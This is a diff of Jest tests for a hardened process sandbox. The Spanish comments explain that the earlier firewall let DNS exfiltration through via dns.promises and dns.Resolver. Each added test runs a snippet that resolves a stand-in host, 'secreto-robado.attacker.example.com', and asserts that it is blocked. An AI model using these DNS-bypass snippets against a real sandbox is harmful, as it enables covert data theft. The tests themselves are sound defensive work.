@@ -101,6 +101,81 @@ describe('HardenedProcessSandboxAdapter', () => {
       expect(result.stdout).not.toContain('CONECTADO');
     });
 
+    // Ola 2 P4: el cortafuegos anterior solo parcheaba dns.lookup/resolve/
+    // resolve4/resolve6 (las funciones planas del módulo 'dns'). dns.promises
+    // y dns.Resolver son objetos DISTINTOS que no pasaban por ese parche —
+    // suficiente para exfiltrar datos codificados en el propio nombre de
+    // host consultado, sin necesitar que la resolución llegue a completarse
+    // (payload real de exfiltración por DNS).
+    it('bloquea exfiltración vía dns.promises.lookup (bypass del cortafuegos anterior)', async () => {
+      // dns.promises.lookup ahora lanza SÍNCRONAMENTE al llamarla (igual que
+      // el resto de los parches de este guard) — nunca llega a devolver una
+      // promesa, así que el .then()/.catch() nunca se encadena: el proceso
+      // termina con excepción no capturada ANTES del setTimeout('fin'). Es
+      // exactamente el mismo patrón que el test ya existente de
+      // 'net.connect' (SSRF) de más arriba: lo que importa es que el dato
+      // nunca sale y el intento se reporta como fallo, no como aceptado.
+      const result = await adapter.executeIsolated(
+        `require('dns').promises.lookup('secreto-robado.attacker.example.com')
+           .then(() => console.log('LEAKED'));
+         setTimeout(() => console.log('fin'), 100);`,
+        'javascript',
+        { expected: '' },
+      );
+
+      expect(result.status).toBe('runtime_error');
+      expect(result.stdout).not.toContain('LEAKED');
+      expect(result.stdout).not.toContain('fin');
+      expect(result.stderr).toContain('SandboxViolation');
+    });
+
+    it('bloquea exfiltración vía require("dns/promises").resolve4 (import directo del submódulo)', async () => {
+      const result = await adapter.executeIsolated(
+        `require('dns/promises').resolve4('secreto-robado.attacker.example.com')
+           .then(() => console.log('LEAKED'));
+         setTimeout(() => console.log('fin'), 100);`,
+        'javascript',
+        { expected: '' },
+      );
+
+      expect(result.status).toBe('runtime_error');
+      expect(result.stdout).not.toContain('LEAKED');
+      expect(result.stdout).not.toContain('fin');
+      expect(result.stderr).toContain('SandboxViolation');
+    });
+
+    it('bloquea exfiltración vía new dns.Resolver() (clase, no las funciones planas del módulo)', async () => {
+      const result = await adapter.executeIsolated(
+        `const { Resolver } = require('dns');
+         try {
+           new Resolver().resolve4('secreto-robado.attacker.example.com', () => console.log('LEAKED'));
+         } catch (e) {
+           console.log('blocked: ' + e.message);
+         }`,
+        'javascript',
+        { expected: '' },
+      );
+
+      expect(result.stdout).not.toContain('LEAKED');
+      expect(result.stdout).toContain('SandboxViolation');
+    });
+
+    it('bloquea exfiltración vía dns.promises.Resolver (clase de la API basada en promesas)', async () => {
+      const result = await adapter.executeIsolated(
+        `const { Resolver } = require('dns').promises;
+         new Resolver().resolveTxt('secreto-robado.attacker.example.com')
+           .then(() => console.log('LEAKED'));
+         setTimeout(() => console.log('fin'), 100);`,
+        'javascript',
+        { expected: '' },
+      );
+
+      expect(result.status).toBe('runtime_error');
+      expect(result.stdout).not.toContain('LEAKED');
+      expect(result.stdout).not.toContain('fin');
+      expect(result.stderr).toContain('SandboxViolation');
+    });
+
     it('corta un bucle infinito por timeout sin colgar el proceso host', async () => {
       const result = await adapter.executeIsolated('while(true){}', 'javascript', {
         expected: '',
